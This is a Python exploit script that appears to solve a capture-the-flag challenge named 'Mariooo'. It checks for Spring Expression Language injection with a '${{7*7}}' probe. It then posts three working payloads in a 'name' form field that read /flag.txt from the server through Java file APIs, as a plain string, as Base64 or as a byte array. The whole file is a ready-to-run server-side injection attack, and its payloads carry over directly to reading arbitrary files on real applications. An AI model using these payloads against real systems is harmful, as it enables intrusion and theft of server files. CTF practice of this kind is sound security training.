#!/usr/bin/env python3
"""
Mariooo Challenge - Automated Exploit
SpEL Injection to read /flag.txt

Usage:
    python exploit.py <target_url>
    
Example:
    python exploit.py http://c1.arena.airoverflow.com:12345/
"""

import requests
import sys
import base64
from urllib.parse import urljoin

def banner():
    """Print exploit banner"""
    print("=" * 70)
    print("Mariooo Challenge - SpEL Injection Exploit")
    print("Target: /flag.txt")
    print("=" * 70)
    print()

def test_vulnerability(base_url):
    """Test if the target is vulnerable to SpEL injection"""
    print("[*] Testing for SpEL injection vulnerability...")
    
    # Test basic expression evaluation
    test_payload = "${{7*7}}"
    
    try:
        response = requests.post(
            base_url,
            data={"name": test_payload},
            timeout=10
        )
        
        if "49" in response.text:
            print("[+] Target is vulnerable to SpEL injection!")
            print(f"    Test payload: {test_payload}")
            print(f"    Result: Found '49' in response")
            return True
        else:
            print("[-] Basic expression test failed")
            return False
            
    except Exception as e:
        print(f"[-] Error during vulnerability test: {e}")
        return False

def exploit_read_flag_string(base_url):
    """Exploit using direct string conversion"""
    print("\n[*] Attempting to read flag using String conversion...")
    
    payload = "${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    
    try:
        response = requests.post(
            base_url,
            data={"name": payload},
            timeout=10
        )
        
        # Look for PCC{ flag pattern
        if "PCC{" in response.text:
            import re
            flag_match = re.search(r'PCC\{[^}]+\}', response.text)
            if flag_match:
                flag = flag_match.group(0)
                print("\n" + "=" * 70)
                print("ðŸš© FLAG FOUND!")
                print("=" * 70)
                print(f"Flag: {flag}")
                print("=" * 70)
                return flag
        else:
            print("[-] Flag not found in response")
            print(f"    Response preview: {response.text[:200]}")
            return None
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return None

def exploit_read_flag_base64(base_url):
    """Exploit using Base64 encoding (alternative method)"""
    print("\n[*] Attempting to read flag using Base64 encoding...")
    
    payload = "${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    
    try:
        response = requests.post(
            base_url,
            data={"name": payload},
            timeout=10
        )
        
        # Look for base64 pattern (alphanumeric + = padding)
        import re
        b64_match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', response.text)
        
        if b64_match:
            b64_string = b64_match.group(0)
            print(f"[+] Found Base64 string: {b64_string[:50]}...")
            
            try:
                decoded = base64.b64decode(b64_string).decode('utf-8')
                print("\n" + "=" * 70)
                print("ðŸš© FLAG FOUND (Base64 decoded)!")
                print("=" * 70)
                print(f"Flag: {decoded}")
                print("=" * 70)
                return decoded
            except Exception as e:
                print(f"[-] Error decoding Base64: {e}")
                return None
        else:
            print("[-] No Base64 string found in response")
            return None
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return None

def exploit_read_flag_bytes(base_url):
    """Exploit using byte array (fallback method)"""
    print("\n[*] Attempting to read flag as byte array...")
    
    payload = "${T(java.util.Arrays).toString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    
    try:
        response = requests.post(
            base_url,
            data={"name": payload},
            timeout=10
        )
        
        # Look for byte array pattern like [80, 67, 67, ...]
        import re
        bytes_match = re.search(r'\[(\d+(?:,\s*\d+)*)\]', response.text)
        
        if bytes_match:
            bytes_str = bytes_match.group(1)
            print(f"[+] Found byte array: {bytes_str[:100]}...")
            
            try:
                # Convert string of bytes to actual bytes
                byte_values = [int(x.strip()) for x in bytes_str.split(',')]
                decoded = bytes(byte_values).decode('utf-8')
                print("\n" + "=" * 70)
                print("ðŸš© FLAG FOUND (from byte array)!")
                print("=" * 70)
                print(f"Flag: {decoded}")
                print("=" * 70)
                return decoded
            except Exception as e:
                print(f"[-] Error converting byte array: {e}")
                return None
        else:
            print("[-] No byte array found in response")
            return None
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return None

def main():
    banner()
    
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <target_url>")
        print("\nExample:")
        print("  python exploit.py http://c1.arena.airoverflow.com:12345/")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Ensure URL ends with /
    if not target_url.endswith('/'):
        target_url += '/'
    
    print(f"Target URL: {target_url}")
    print()
    
    # Test vulnerability
    if not test_vulnerability(target_url):
        print("\n[-] Target does not appear to be vulnerable")
        print("    Check if the URL is correct")
        sys.exit(1)
    
    # Try exploitation methods in order
    flag = exploit_read_flag_string(target_url)
    
    if not flag:
        print("\n[*] String method failed, trying Base64...")
        flag = exploit_read_flag_base64(target_url)
    
    if not flag:
        print("\n[*] Base64 method failed, trying byte array...")
        flag = exploit_read_flag_bytes(target_url)
    
    if flag:
        print("\n[+] Exploitation successful!")
        
        # Save flag to file
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[+] Flag saved to flag.txt")
    else:
        print("\n[-] All exploitation methods failed")
        print("    Try manual exploitation or check network connectivity")
        sys.exit(1)

if __name__ == "__main__":
    main()
